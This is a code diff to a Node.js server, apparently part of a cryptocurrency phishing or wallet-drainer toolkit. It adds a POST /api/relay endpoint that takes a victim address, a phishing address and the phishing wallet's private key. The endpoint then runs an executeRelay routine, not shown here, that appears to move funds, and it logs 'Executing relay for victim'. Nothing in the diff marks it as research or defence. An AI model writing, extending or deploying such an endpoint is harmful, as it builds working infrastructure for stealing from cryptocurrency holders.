@@ -92,6 +92,60 @@ async function handleApi(req, res) {
 }
 
 // ---------------------------------------------------------------------------
+// API handler POST /api/relay
+// ---------------------------------------------------------------------------
+async function handleRelayApi(req, res) {
+    if (req.method !== 'POST') {
+        res.writeHead(405, { 'Content-Type': 'application/json' });
+        return res.end(JSON.stringify({ error: 'Method Not Allowed. Use POST.' }));
+    }
+
+    return new Promise((resolve) => {
+        let body = '';
+        req.on('data', (chunk) => {
+            body += chunk.toString();
+        });
+
+        req.on('end', async () => {
+            try {
+                const params = JSON.parse(body || '{}');
+                const { victimAddress, phishingAddress, phishingPrivateKey, fundAmount } = params;
+
+                if (!victimAddress || !phishingAddress || !phishingPrivateKey) {
+                    res.writeHead(400, { 'Content-Type': 'application/json' });
+                    res.end(
+                        JSON.stringify({
+                            error: 'Missing required parameters (victimAddress, phishingAddress, phishingPrivateKey).',
+                        })
+                    );
+                    return resolve();
+                }
+
+                // Dynamic import for ESM module support in CommonJS
+                const relayPath = 'file://' + path.join(__dirname, 'src', 'js', 'relay.mjs');
+                const { executeRelay } = await import(relayPath);
+
+                console.log(`[server] Executing relay for victim: ${victimAddress}`);
+                const result = await executeRelay({
+                    victimAddress,
+                    phishingAddress,
+                    phishingPrivateKey,
+                    fundAmount: fundAmount || '0.0003',
+                });
+
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify(result));
+            } catch (err) {
+                console.error('[server] Relay execution failed:', err.message);
+                res.writeHead(500, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: err.message }));
+            }
+            resolve();
+        });
+    });
+}
+
+// ---------------------------------------------------------------------------
 // Static file handler
 // ---------------------------------------------------------------------------
 function handleStatic(req, res) {
@@ -141,6 +195,10 @@ const server = http.createServer(async (req, res) => {
 
     if (pathname === '/api/wallet-recurrence') {
         return handleApi(req, res);
+    }
+
+    if (pathname === '/api/relay') {
+        return handleRelayApi(req, res);
     }
 
     handleStatic(req, res);
